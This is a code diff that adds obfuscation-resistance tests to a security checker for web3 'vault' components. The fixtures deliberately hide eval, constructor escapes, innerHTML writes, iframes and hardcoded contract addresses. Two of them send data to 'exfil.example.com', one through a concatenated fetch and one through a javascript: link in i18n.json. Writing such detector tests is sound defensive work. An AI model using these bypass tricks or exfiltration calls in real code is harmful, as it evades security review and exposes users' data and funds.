@@ -817,6 +817,95 @@ export default function SelftestVault(_props: VaultComponentProps) {
   });
   assertRule("dynamic fetch targets are blocked", runVaultCheck(dynamicFetchSlug, { silent: true }), "endpoint-policy/direct-fetch", "blocking");
 
+  // Obfuscation-resistance: each of these previously bypassed the line-regex layer.
+  const obfBody = (statements) => `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { sdk, i18n } = useFlapSdk();
+  void sdk;
+${statements}
+  return <div>{i18n.t("title")}</div>;
+}
+`;
+
+  const concatAddressSlug = `${FIXTURE_PREFIX}-concat-address`;
+  writeVault(concatAddressSlug, {
+    component: obfBody(`  const nftAddress = "0x" + "1234567890" + "abcdef1234" + "567890abcd" + "ef12345678";
+  void sdk.writeContract({ contract: "nft", address: nftAddress, functionName: "transfer", args: [] });`),
+  });
+  assertRule("concatenated hardcoded address is blocked", runVaultCheck(concatAddressSlug, { silent: true }), "security/hardcoded-address", "blocking");
+  assertRule("concatenated contract target is outside the boundary", runVaultCheck(concatAddressSlug, { silent: true }), "contract-boundary/undeclared-contract-address", "blocking");
+
+  const commaEvalSlug = `${FIXTURE_PREFIX}-comma-eval`;
+  writeVault(commaEvalSlug, { component: obfBody(`  (0, eval)("2 + 2");`) });
+  assertRule("indirect (0, eval) is blocked", runVaultCheck(commaEvalSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const aliasEvalSlug = `${FIXTURE_PREFIX}-alias-eval`;
+  writeVault(aliasEvalSlug, { component: obfBody(`  const run = eval;
+  void run("2 + 2");`) });
+  assertRule("aliased eval is blocked", runVaultCheck(aliasEvalSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const timerStringSlug = `${FIXTURE_PREFIX}-timer-string`;
+  writeVault(timerStringSlug, { component: obfBody(`  const payload = "alert(1)";
+  setTimeout(payload, 0);`) });
+  assertRule("string-variable timer callback is blocked", runVaultCheck(timerStringSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const computedConstructorSlug = `${FIXTURE_PREFIX}-computed-constructor`;
+  writeVault(computedConstructorSlug, { component: obfBody(`  const make = [][("cons" + "tructor")]["constructor"];
+  void make;`) });
+  assertRule("computed constructor escape is blocked", runVaultCheck(computedConstructorSlug, { silent: true }), "forbidden-api/function-constructor", "blocking");
+
+  const reflectConstructSlug = `${FIXTURE_PREFIX}-reflect-construct`;
+  writeVault(reflectConstructSlug, { component: obfBody(`  const fn: unknown[] = [];
+  void Reflect.construct(Object, fn);`) });
+  assertRule("Reflect.construct invocation is blocked", runVaultCheck(reflectConstructSlug, { silent: true }), "forbidden-api/function-constructor", "blocking");
+
+  const reactIframeSlug = `${FIXTURE_PREFIX}-react-iframe`;
+  writeVault(reactIframeSlug, { component: obfBody(`  const R = (globalThis as { React?: { createElement: (...args: unknown[]) => unknown } }).React;
+  void R?.createElement("if" + "rame", { src: "x" });`) });
+  assertRule("concatenated createElement iframe is blocked", runVaultCheck(reactIframeSlug, { silent: true }), "forbidden-api/iframe", "blocking");
+
+  const computedHtmlSlug = `${FIXTURE_PREFIX}-computed-html`;
+  writeVault(computedHtmlSlug, { component: obfBody(`  const target: Record<string, string> = {};
+  target[("inner" + "HTML")] = i18n.t("title");`) });
+  assertRule("computed innerHTML assignment is blocked", runVaultCheck(computedHtmlSlug, { silent: true }), "forbidden-api/script", "blocking");
+
+  const concatUrlSlug = `${FIXTURE_PREFIX}-concat-url`;
+  writeVault(concatUrlSlug, { component: obfBody(`  const host = "ht" + "tps://exfil.example.com/c?a=";
+  void (0, fetch)(host + "1");`) });
+  assertRule("concatenated exfil URL is blocked", runVaultCheck(concatUrlSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+  assertRule("indirect (0, fetch) is blocked", runVaultCheck(concatUrlSlug, { silent: true }), "forbidden-api/browser-network", "blocking");
+
+  const bareProviderSlug = `${FIXTURE_PREFIX}-bare-provider`;
+  writeVault(bareProviderSlug, { component: obfBody(`  const provider: { request: (args: unknown) => Promise<unknown> } = ethereum;
+  const method = ["e", "t", "h"].join("");
+  void provider.request({ method });`) });
+  assertRule("bare injected provider identifier is blocked", runVaultCheck(bareProviderSlug, { silent: true }), "forbidden-api/direct-window-ethereum", "blocking");
+
+  const i18nPayloadSlug = `${FIXTURE_PREFIX}-i18n-payload`;
+  writeVault(i18nPayloadSlug, {
+    i18n: { en: { title: "Selftest", link: "javascript:fetch('https://exfil.example.com/steal')" } },
+  });
+  assertRule("unsafe scheme hidden in i18n.json is blocked", runVaultCheck(i18nPayloadSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+
+  const i18nAddressSlug = `${FIXTURE_PREFIX}-i18n-address`;
+  writeVault(i18nAddressSlug, {
+    i18n: { en: { title: "Selftest", ref: "0x1234567890abcdef1234567890abcdef12345678" } },
+  });
+  assertRule("hardcoded address hidden in i18n.json is blocked", runVaultCheck(i18nAddressSlug, { silent: true }), "security/hardcoded-address", "blocking");
+
+  const benignConcatSlug = `${FIXTURE_PREFIX}-benign-concat`;
+  writeVault(benignConcatSlug, {
+    component: obfBody(`  const label = "Balance: " + i18n.t("title") + " tokens";
+  void label;`),
+  });
+  assertNoRule("benign string concatenation is not flagged as a URL", runVaultCheck(benignConcatSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+  assertNoRule("benign string concatenation is not flagged as an address", runVaultCheck(benignConcatSlug, { silent: true }), "security/hardcoded-address", "blocking");
+  passed.push("obfuscation-resistant security checks cover eval/provider/injection/concat bypasses");
+
   const credentialedFetchSlug = `${FIXTURE_PREFIX}-credentialed-fetch`;
   writeVault(credentialedFetchSlug, {
     manifest: baseManifest({
